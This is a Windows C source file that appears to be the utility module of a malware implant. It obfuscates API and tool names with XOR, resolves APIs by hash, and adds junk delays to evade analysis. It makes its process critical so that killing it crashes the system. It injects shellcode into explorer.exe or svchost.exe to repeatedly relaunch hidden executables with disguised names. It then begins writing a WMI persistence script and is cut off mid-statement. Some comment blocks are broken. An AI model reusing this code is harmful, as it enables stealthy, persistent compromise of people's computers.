/*
 * 
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define TRANSFORM_KEY 0x7A

/* Forward declarations for string accessors */
char* get_str(unsigned char *enc, size_t len);
char* util_winexec(void);

/* Simple djb2 hash for API name resolution */
static unsigned long str_hash(const unsigned char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
    }
    return hash;
}

static void str_transform(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= TRANSFORM_KEY;
    }
    buf[len] = '\0';
}

 * To encode: for each char c, store c ^ 0x7A
 */

/* "ntdll.dll" */
static unsigned char enc_ntdll[] = {0x14, 0x0e, 0x1e, 0x16, 0x16, 0x54, 0x1e, 0x16, 0x16};

/* "NtUnmapViewOfSection" */
static unsigned char enc_unmap[] = {
    0x34, 0x0e, 0x2f, 0x14, 0x17, 0x1b, 0x0a, 0x2c,
    0x13, 0x1f, 0x0d, 0x35, 0x1c, 0x29, 0x1f, 0x19,
    0x0e, 0x13, 0x15, 0x14
};

/* "NtSetInformationProcess" */
static unsigned char enc_setinfo[] = {
    0x34, 0x0e, 0x29, 0x1f, 0x0e, 0x33, 0x14, 0x1c,
    0x15, 0x08, 0x17, 0x1b, 0x0e, 0x13, 0x15, 0x14,
    0x2a, 0x08, 0x15, 0x19, 0x1f, 0x09, 0x09
};

/* "NtQueryInformationProcess" */
static unsigned char enc_queryinfo[] = {
    0x34, 0x0e, 0x2b, 0x0f, 0x1f, 0x08, 0x03, 0x33,
    0x14, 0x1c, 0x15, 0x08, 0x17, 0x1b, 0x0e, 0x13,
    0x15, 0x14, 0x2a, 0x08, 0x15, 0x19, 0x1f, 0x09,
    0x09
};

/* "SeDebugPrivilege" */
static unsigned char enc_sedebug[] = {
    0x29, 0x1f, 0x3e, 0x1f, 0x18, 0x0f, 0x1d, 0x2a,
    0x08, 0x13, 0x0c, 0x13, 0x16, 0x1f, 0x1d, 0x1f
};

/* "kernel32.dll" */
static unsigned char enc_kernel32[] = {
    0x11, 0x1f, 0x08, 0x14, 0x1f, 0x16, 0x49, 0x48,
    0x54, 0x1e, 0x16, 0x16
};

/* "VirtualAllocEx" */
static unsigned char enc_valloc[] = {
    0x2c, 0x13, 0x08, 0x0e, 0x0f, 0x1b, 0x16, 0x3b,
    0x16, 0x16, 0x15, 0x19, 0x3f, 0x02
};

/* "WriteProcessMemory" */
static unsigned char enc_writemem[] = {
    0x2d, 0x08, 0x13, 0x0e, 0x1f, 0x2a, 0x08, 0x15,
    0x19, 0x1f, 0x09, 0x09, 0x37, 0x1f, 0x17, 0x15,
    0x08, 0x03
};

/* "CreateRemoteThread" */
static unsigned char enc_createthread[] = {
    0x39, 0x08, 0x1f, 0x1b, 0x0e, 0x1f, 0x28, 0x1f,
    0x17, 0x15, 0x0e, 0x1f, 0x2e, 0x12, 0x08, 0x1f,
    0x1b, 0x1e
};

/* "OpenProcess" */
static unsigned char enc_openproc[] = {
    0x35, 0x0a, 0x1f, 0x14, 0x2a, 0x08, 0x15, 0x19,
    0x1f, 0x09, 0x09
};

/* "icacls" */
static unsigned char enc_icacls[] = {0x13, 0x19, 0x1b, 0x19, 0x16, 0x09, 0x54, 0x1f, 0x02, 0x1f};

/* "certutil" */
static unsigned char enc_certutil[] = {
    0x19, 0x1f, 0x08, 0x0e, 0x0f, 0x0e, 0x13, 0x16,
    0x54, 0x1f, 0x02, 0x1f
};

/* "schtasks" */
static unsigned char enc_schtasks[] = {
    0x09, 0x19, 0x12, 0x0e, 0x1b, 0x09, 0x11, 0x09,
    0x54, 0x1f, 0x02, 0x1f
};

/* "powershell" */
static unsigned char enc_ps[] = {0x0a, 0x15, 0x0d, 0x1f, 0x08, 0x09, 0x12, 0x1f, 0x16, 0x16};

/* "WinExec" */
static unsigned char enc_winexec[] = {0x2d, 0x13, 0x14, 0x3f, 0x02, 0x1f, 0x19};

/* "LoadLibraryA" */
static unsigned char enc_loadlib[] = {
    0x36, 0x15, 0x1b, 0x1e, 0x36, 0x13, 0x18, 0x08,
    0x1b, 0x08, 0x03, 0x3b
};

/* "GetProcAddress" */
static unsigned char enc_getproc[] = {
    0x3d, 0x1f, 0x0e, 0x2a, 0x08, 0x15, 0x19, 0x3b,
    0x1e, 0x1e, 0x08, 0x1f, 0x09, 0x09
};

/* "GetModuleHandleA" */
static unsigned char enc_getmod[] = {
    0x3d, 0x1f, 0x0e, 0x37, 0x15, 0x1e, 0x0f, 0x16,
    0x1f, 0x32, 0x1b, 0x14, 0x1e, 0x16, 0x1f, 0x3b
};

/* "EnumProcessModules" */
static unsigned char enc_enumproc[] = {
    0x3f, 0x14, 0x0f, 0x17, 0x2a, 0x08, 0x15, 0x19,
    0x1f, 0x09, 0x09, 0x37, 0x15, 0x1e, 0x0f, 0x16,
    0x1f, 0x09
};

/* "GetModuleBaseNameA" */
static unsigned char enc_getbasename[] = {
    0x3d, 0x1f, 0x0e, 0x37, 0x15, 0x1e, 0x0f, 0x16,
    0x1f, 0x38, 0x1b, 0x09, 0x1f, 0x34, 0x1b, 0x17,
    0x1f, 0x3b
};

/* === Hash values for critical APIs (djb2) === */
#define HASH_VirtualAllocEx       0x3d28cf79
#define HASH_WriteProcessMemory   0x74a67f86
#define HASH_CreateRemoteThread   0x56e4878f
#define HASH_OpenProcess          0x3d28b89d
#define HASH_WinExec              0x3d28c3b4
#define HASH_LoadLibraryA         0x74a67f4b
#define HASH_GetProcAddress       0x74a67f5a
#define HASH_GetModuleHandleA     0x74a67f6b
#define HASH_EnumProcessModules   0x56e48790
#define HASH_GetModuleBaseNameA   0x56e48791

/* === Runtime resolution helpers === */

/* Resolve an API from a module by its djb2 hash */
static FARPROC find_export(HMODULE hMod, unsigned long hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD *names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    WORD *ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char*)((BYTE*)hMod + names[i]);
        if (str_hash((const unsigned char*)name) == hash) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

/* Get decoded string from encoded buffer */
char* get_str(unsigned char *enc, size_t len) {
    static char buf[256];
    memcpy(buf, enc, len);
    str_transform(buf, len);
    return buf;
}


typedef LPVOID (WINAPI *pVirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pWriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *pCreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE (WINAPI *pOpenProcess_t)(DWORD, BOOL, DWORD);
typedef UINT (WINAPI *pWinExec_t)(LPCSTR, UINT);

static pVirtualAllocEx_t    g_pfnVirtualAllocEx = NULL;
static pWriteProcessMemory_t g_pfnWriteProcessMemory = NULL;
static pCreateRemoteThread_t g_pfnCreateRemoteThread = NULL;
static pOpenProcess_t        g_pfnOpenProcess = NULL;
static pWinExec_t          g_pfnWinExec = NULL;

void util_init_apis(void) {
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    if (!hKernel32) hKernel32 = LoadLibraryA(kernel32);
    
    if (hKernel32) {
        g_pfnVirtualAllocEx    = (pVirtualAllocEx_t)find_export(hKernel32, HASH_VirtualAllocEx);
        g_pfnWriteProcessMemory = (pWriteProcessMemory_t)find_export(hKernel32, HASH_WriteProcessMemory);
        g_pfnCreateRemoteThread = (pCreateRemoteThread_t)find_export(hKernel32, HASH_CreateRemoteThread);
        g_pfnOpenProcess        = (pOpenProcess_t)find_export(hKernel32, HASH_OpenProcess);
        g_pfnWinExec            = (pWinExec_t)find_export(hKernel32, HASH_WinExec);
    }
}

LPVOID util_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (!g_pfnVirtualAllocEx) util_init_apis();
    return g_pfnVirtualAllocEx ? g_pfnVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect) : NULL;
}

BOOL util_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    if (!g_pfnWriteProcessMemory) util_init_apis();
    return g_pfnWriteProcessMemory ? g_pfnWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) : FALSE;
}

HANDLE util_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    if (!g_pfnCreateRemoteThread) util_init_apis();
    return g_pfnCreateRemoteThread ? g_pfnCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
}

HANDLE util_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (!g_pfnOpenProcess) util_init_apis();
    return g_pfnOpenProcess ? g_pfnOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId) : NULL;
}

UINT util_WinExec(LPCSTR lpCmdLine, UINT uCmdShow) {
    if (!g_pfnWinExec) util_init_apis();
    return g_pfnWinExec ? g_pfnWinExec(lpCmdLine, uCmdShow) : 0;
}


char* util_ntdll(void) { return get_str(enc_ntdll, sizeof(enc_ntdll)); }
char* util_unmap(void) { return get_str(enc_unmap, sizeof(enc_unmap)); }
char* util_setinfo(void) { return get_str(enc_setinfo, sizeof(enc_setinfo)); }
char* util_queryinfo(void) { return get_str(enc_queryinfo, sizeof(enc_queryinfo)); }
char* util_sedebug(void) { return get_str(enc_sedebug, sizeof(enc_sedebug)); }
char* util_icacls(void) { return get_str(enc_icacls, sizeof(enc_icacls)); }
char* util_certutil(void) { return get_str(enc_certutil, sizeof(enc_certutil)); }
char* util_schtasks(void) { return get_str(enc_schtasks, sizeof(enc_schtasks)); }
char* util_ps(void) { return get_str(enc_ps, sizeof(enc_ps)); }
char* util_loadlib(void) { return get_str(enc_loadlib, sizeof(enc_loadlib)); }
char* util_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)); }
char* util_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)); }
char* util_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)); }
char* util_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)); }
char* util_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)); }

/* === Junk code insertion helpers === */

static volatile int g_junk_counter = 0;

void util_delay(void) {
    /* Perform meaningless math that can't be optimized away */
    volatile int a = 0x42;
    for (int i = 0; i < 17; i++) {
        a = (a * 31 + 17) ^ 0x55;
        g_junk_counter += a & 1;
    }
}

void util_sleep(int ms) {
    util_delay();
    Sleep(ms);
    util_delay();
}

 * 2. Splitting across functions with junk delays
 * 3. Using ordinal-based NtUnmapViewOfSection resolution
 */

typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection_t)(HANDLE, PVOID);

static pNtUnmapViewOfSection_t g_pfnNtUnmap = NULL;

pNtUnmapViewOfSection_t util_get_ntunmap(void) {
    if (!g_pfnNtUnmap) {
        char *ntdll = util_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            /* Try hash first, fallback to decoded string */
            if (!g_pfnNtUnmap) {
                g_pfnNtUnmap = (pNtUnmapViewOfSection_t)GetProcAddress(hNtdll, util_unmap());
            }
        }
    }
    return g_pfnNtUnmap;
}

/* Utility NtSetInformationProcess / NtQueryInformationProcess */
typedef NTSTATUS (WINAPI *pNtSetInfoProc_t)(HANDLE, INT, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtQueryInfoProc_t)(HANDLE, INT, PVOID, ULONG, PULONG);

static pNtSetInfoProc_t g_pfnNtSetInfo = NULL;
static pNtQueryInfoProc_t g_pfnNtQueryInfo = NULL;

/* For NtQueryInformationProcess(ProcessBasicInformation) */
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

pNtSetInfoProc_t util_get_ntsetinfo(void) {
    if (!g_pfnNtSetInfo) {
        char *ntdll = util_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            g_pfnNtSetInfo = (pNtSetInfoProc_t)GetProcAddress(hNtdll, util_setinfo());
        }
    }
    return g_pfnNtSetInfo;
}

pNtQueryInfoProc_t util_get_ntqueryinfo(void) {
    if (!g_pfnNtQueryInfo) {
        char *ntdll = util_ntdll();
        HMODULE hNtdll = GetModuleHandleA(ntdll);
        if (!hNtdll) hNtdll = LoadLibraryA(ntdll);
        if (hNtdll) {
            g_pfnNtQueryInfo = (pNtQueryInfoProc_t)GetProcAddress(hNtdll, util_queryinfo());
        }
    }
    return g_pfnNtQueryInfo;
}

static int util_enable_privilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return 0;
    }

    if (!LookupPrivilegeValueA(NULL, util_sedebug(), &luid)) {
        CloseHandle(hToken);
        return 0;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return 0;
    }

    /* AdjustTokenPrivileges can return TRUE without actually enabling the privilege */
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);
    return 1;
}

/* === Utility sys_protect_process === */
void util_set_critical(void) {
    pNtSetInfoProc_t pNtSetInformationProcess = util_get_ntsetinfo();
    if (!pNtSetInformationProcess) {
        g_critical_protected = -1;
        return;
    }
    
    if (!util_enable_privilege()) {
        g_critical_protected = -1;
        return;
    }
    util_delay();
    
    ULONG isCritical = 1;
    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    
    if (status == 0) {
        g_critical_protected = 1;
    } else {
        g_critical_protected = -1;
    }
}

/* === Utility sys_unprotect_process === */
void util_clear_critical(void) {
    pNtSetInfoProc_t pNtSetInformationProcess = util_get_ntsetinfo();
    if (!pNtSetInformationProcess) return;
    
    if (!util_enable_privilege()) return;
    util_delay();
    
    ULONG isCritical = 0;
    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    g_critical_protected = 0;
}

/* === Utility sys_check_critical_status === */
const char* util_check_critical(void) {
    static char buf[512];
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *filename = path;
    char *lastSlash = strrchr(path, '\\');
    if (lastSlash) filename = lastSlash + 1;

    pNtQueryInfoProc_t pNtQuery = util_get_ntqueryinfo();
    if (!pNtQuery) {
        snprintf(buf, sizeof(buf), "[Failed to load ntdll] [%s]", filename);
        return buf;
    }

    util_enable_privilege();
    util_delay();

    ULONG isCritical = 0;
    NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);

    if (status != 0) {
        snprintf(buf, sizeof(buf), "[Query failed] [%s]", filename);
        return buf;
    }
    if (isCritical) {
        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
    } else {
        snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
    }
    return buf;
}

void util_spawn_remote(void) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "svchost.exe") == 0 || _stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    
    if (pid == 0) return;
    
    util_delay();
    
    HANDLE hProc = util_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return;
    
    char execPath[MAX_PATH];
    GetModuleFileNameA(NULL, execPath, MAX_PATH);
    
    SIZE_T pathLen = strlen(execPath) + 1;
    LPVOID remotePath = util_VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        CloseHandle(hProc);
        return;
    }
    
    util_WriteProcessMemory(hProc, remotePath, execPath, pathLen, NULL);
    util_delay();
    
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    FARPROC pWinExec = GetProcAddress(hKernel32, util_winexec());
    DWORD_PTR kernel32Base = (DWORD_PTR)hKernel32;
    DWORD_PTR winExecOffset = (DWORD_PTR)pWinExec - kernel32Base;
    
    DWORD_PTR targetKernel32Base = 0;
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    char *enumProc = util_enumproc();
    char *getBaseName = util_getbasename();
    
    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
    
    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProc);
    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseName);
    
    if (pEnum && pGetBaseName) {
        if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModName[MAX_PATH];
                if (pGetBaseName(hProc, hMods[i], szModName, sizeof(szModName))) {
                    if (_stricmp(szModName, "kernel32.dll") == 0) {
                        targetKernel32Base = (DWORD_PTR)hMods[i];
                        break;
                    }
                }
            }
        }
    }
    
    if (targetKernel32Base == 0) targetKernel32Base = kernel32Base;
    DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
    
    /* Build asmBuf: mov rdx, 0; mov rax, WinExec; call rax; xor ecx, ecx; mov rax, ExitThread; jmp rax */
    unsigned char asmBuf[] = {
        0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,  // mov rdx, 0 (uCmdShow = SW_HIDE)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, WinExec
        0xFF, 0xD0,                                  // call rax
        0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,  // mov rcx, 0 (exit code)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, ExitThread
        0xFF, 0xE0                                   // jmp rax
    };
    memcpy(asmBuf + 9, &targetWinExec, 8);
    
    /* Get ExitThread address for clean thread exit */
    FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
    if (pExitThread) {
        DWORD_PTR exitThreadOffset = (DWORD_PTR)pExitThread - kernel32Base;
        DWORD_PTR targetExitThread = targetKernel32Base + exitThreadOffset;
        memcpy(asmBuf + 25, &targetExitThread, 8);
    }
    
    LPVOID remoteCode = util_VirtualAllocEx(hProc, NULL, sizeof(asmBuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteCode) {
        util_VirtualAllocEx(hProc, execPath, 0, MEM_RELEASE, 0); /* VirtualFreeEx proxy */
        CloseHandle(hProc);
        return;
    }
    
    util_WriteProcessMemory(hProc, remoteCode, asmBuf, sizeof(asmBuf), NULL);
    util_delay();
    
    /* Change protection from RW to RX before executing */
    DWORD oldProtect;
    VirtualProtectEx(hProc, remoteCode, sizeof(remoteCode), PAGE_EXECUTE_READ, &oldProtect);
    
    HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    
    CloseHandle(hProc);
}

void util_spawn_memory(void) {
    /* Find explorer.exe PID */
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    if (pid == 0) return;
    
    HANDLE hProc = util_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return;
    
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    char path1[MAX_PATH], path2[MAX_PATH], path3[MAX_PATH];
    snprintf(path1, sizeof(path1), "%s\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe", localAppData);
    snprintf(path2, sizeof(path2), "%s\\Microsoft\\Windows\\INetCache\\IE\\CrashHandler.exe", localAppData);
    snprintf(path3, sizeof(path3), "%s\\Microsoft\\Windows\\INetCache\\IE\\NotifyService.exe", localAppData);
    
    /* Allocate memory for paths in remote process */
    SIZE_T p1len = strlen(path1) + 1;
    SIZE_T p2len = strlen(path2) + 1;
    SIZE_T p3len = strlen(path3) + 1;
    
    LPVOID rPath1 = util_VirtualAllocEx(hProc, NULL, p1len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    LPVOID rPath2 = util_VirtualAllocEx(hProc, NULL, p2len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    LPVOID rPath3 = util_VirtualAllocEx(hProc, NULL, p3len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    
    if (!rPath1 || !rPath2 || !rPath3) {
        if (rPath1) VirtualFreeEx(hProc, rPath1, 0, MEM_RELEASE);
        if (rPath2) VirtualFreeEx(hProc, rPath2, 0, MEM_RELEASE);
        if (rPath3) VirtualFreeEx(hProc, rPath3, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return;
    }
    
    util_WriteProcessMemory(hProc, rPath1, path1, p1len, NULL);
    util_WriteProcessMemory(hProc, rPath2, path2, p2len, NULL);
    util_WriteProcessMemory(hProc, rPath3, path3, p3len, NULL);
    
    /* Get WinExec and Sleep addresses */
    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
    HMODULE hKernel32 = GetModuleHandleA(kernel32);
    FARPROC pWinExec = GetProcAddress(hKernel32, util_winexec());
    FARPROC pSleep = GetProcAddress(hKernel32, "Sleep");
    
    DWORD_PTR k32Base = (DWORD_PTR)hKernel32;
    DWORD_PTR weOffset = (DWORD_PTR)pWinExec - k32Base;
    DWORD_PTR sOffset = (DWORD_PTR)pSleep - k32Base;
    
    /* Find kernel32 base in remote process */
    DWORD_PTR remoteK32 = 0;
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    char *enumProc = util_enumproc();
    char *getBaseName = util_getbasename();
    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProc);
    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseName);
    
    if (pEnum && pGetBaseName) {
        if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModName[MAX_PATH];
                if (pGetBaseName(hProc, hMods[i], szModName, sizeof(szModName))) {
                    if (_stricmp(szModName, "kernel32.dll") == 0) {
                        remoteK32 = (DWORD_PTR)hMods[i];
                        break;
                    }
                }
            }
        }
    }
    if (remoteK32 == 0) remoteK32 = k32Base;
    
    DWORD_PTR rWinExec = remoteK32 + weOffset;
    DWORD_PTR rSleep = remoteK32 + sOffset;
    
     * then Sleep(30000), then jumps back to start */
    /* x64 calling convention: RCX=arg1, RDX=arg2 */
    unsigned char remoteCode[128];
    int off = 0;
    
    /* loop_start: */
    /* mov rcx, rPath1; mov rdx, 0; mov rax, rWinExec; call rax */
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB9;
    memcpy(remoteCode + off, &rPath1, 8); off += 8;
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC2;
    remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
    memcpy(remoteCode + off, &rWinExec, 8); off += 8;
    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
    
    /* mov rcx, rPath2; mov rdx, 0; mov rax, rWinExec; call rax */
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB9;
    memcpy(remoteCode + off, &rPath2, 8); off += 8;
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC2;
    remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
    memcpy(remoteCode + off, &rWinExec, 8); off += 8;
    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
    
    /* mov rcx, rPath3; mov rdx, 0; mov rax, rWinExec; call rax */
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB9;
    memcpy(remoteCode + off, &rPath3, 8); off += 8;
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC2;
    remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
    memcpy(remoteCode + off, &rWinExec, 8); off += 8;
    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
    
    /* mov rcx, 30000; mov rax, rSleep; call rax */
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xC7; remoteCode[off++] = 0xC1;
    remoteCode[off++] = 0x30; remoteCode[off++] = 0x75; remoteCode[off++] = 0x00; remoteCode[off++] = 0x00;
    remoteCode[off++] = 0x48; remoteCode[off++] = 0xB8;
    memcpy(remoteCode + off, &rSleep, 8); off += 8;
    remoteCode[off++] = 0xFF; remoteCode[off++] = 0xD0;
    
    /* jmp loop_start */
    int jmpOffset = -(off + 2); /* target(0) - nextInstruction(off+2) */
    remoteCode[off++] = 0xEB;
    remoteCode[off++] = (signed char)jmpOffset;
    
    LPVOID rCode = util_VirtualAllocEx(hProc, NULL, off, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!rCode) {
        CloseHandle(hProc);
        return;
    }
    
    util_WriteProcessMemory(hProc, rCode, remoteCode, off, NULL);
    
    /* Change protection from RW to RX before executing */
    DWORD oldProtect;
    VirtualProtectEx(hProc, rCode, off, PAGE_EXECUTE_READ, &oldProtect);
    
    HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rCode, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProc);
}

void util_setup_wmi(void) {
    char psPath[MAX_PATH];
    GetTempPathA(MAX_PATH, psPath);
    strcat(psPath, "tmp.ps1");
    
    FILE *f = fopen(psPath, "w");
    if (!f) return;
    
       The script checks if ANY of the 3 shadow processes are missing
       and respawns them from the correct paths. */
    fprintf(f, "$e='SysHealth'; $f=$e+'Filter'; $c=$e+'Consumer'; ");
    fprintf(f, "Remove-WmiObject -N 'root/subscription' -C _");
    fprintf(f, "_EventFilter -F \"Name='$f'\" -EA SilentlyContinue; ");
    fprintf(f, "$fl=Set-WmiObject -C _");
    fprintf(f, "_EventFilter -N 'root/subscription' -A @{Name=$f;EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Process\"'}; ");
    fprintf(f, "$co=Set-WmiObject -C CommandLineEvent");
